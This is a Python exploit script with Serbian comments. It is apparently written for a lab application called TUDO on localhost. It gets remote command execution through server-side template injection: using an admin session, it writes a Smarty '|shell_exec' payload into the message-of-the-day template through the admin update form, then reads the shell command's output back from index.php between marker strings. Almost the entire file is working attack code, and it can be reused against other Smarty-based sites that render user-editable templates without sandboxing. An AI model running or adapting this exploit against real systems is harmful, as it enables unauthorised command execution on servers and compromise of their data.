#!/usr/bin/env python3
"""
Remote Code Execution - TUDO
----------------------------
Ranjivost: Server-Side Template Injection u Smarty MoTD template-u
Tehnika:   admin/update_motd.php upisuje nas sadrzaj u templates/motd.tpl,
           a index.php ga izvrsava kroz Smarty bez sandbox/security moda
Impact:    Admin moze izvrsiti proizvoljnu shell komandu na serveru
"""

import re
from typing import Optional

import requests


RCE_START = "RCE_START_7f7d4f"
RCE_END = "RCE_END_7f7d4f"


def _smarty_string(value: str) -> str:
    """
    Pravi bezbedan Smarty/PHP string literal za payload.
    """
    return value.replace("\\", "\\\\").replace('"', '\\"')


def _extract_output(html: str) -> Optional[str]:
    pattern = re.compile(
        re.escape(RCE_START) + r"\s*(.*?)\s*" + re.escape(RCE_END),
        re.DOTALL,
    )
    match = pattern.search(html)
    if not match:
        return None
    return match.group(1).strip()


def _can_access_motd_editor(session: requests.Session, target: str) -> bool:
    """
    Admin-only stranica vraca formu za update MoTD-a ako imamo admin sesiju.
    """
    r = session.get(target + "/admin/update_motd.php", allow_redirects=False)
    return r.status_code == 200 and "Update MoTD" in r.text


def _write_template_payload(session: requests.Session, target: str, command: str) -> bool:
    """
    Upisuje Smarty payload u templates/motd.tpl preko admin forme.
    """
    escaped_command = _smarty_string(command + " 2>&1")
    payload = f'{RCE_START}\n{{"{escaped_command}"|shell_exec}}\n{RCE_END}'

    r = session.post(
        target + "/admin/update_motd.php",
        data={"message": payload},
        allow_redirects=False,
    )
    return r.status_code in (200, 302)


def run_rce(session: requests.Session, target: str, command: str = "id") -> bool:
    """
    Izvrsava `command` preko Smarty SSTI u MoTD template-u.

    Parametri:
      session  - requests.Session koji je vec admin
      target   - http://localhost:8000
      command  - shell komanda za izvrsavanje

    Vraca True ako je output komande pronadjen u odgovoru /index.php.
    """
    print(f"[*] Pokusavam RCE preko Smarty MoTD template-a: {command!r}")

    if not _can_access_motd_editor(session, target):
        print("[-] /admin/update_motd.php nije dostupan - sesija nije admin")
        return False

    if not _write_template_payload(session, target, command):
        print("[-] Upis MoTD payload-a nije uspeo")
        return False

    r = session.get(target + "/index.php")
    output = _extract_output(r.text)
    if output is None:
        print("[-] Nije pronadjen RCE marker u /index.php odgovoru")
        return False

    print("[+] RCE uspeo, output komande:")
    print(output if output else "(prazan output)")
    return True
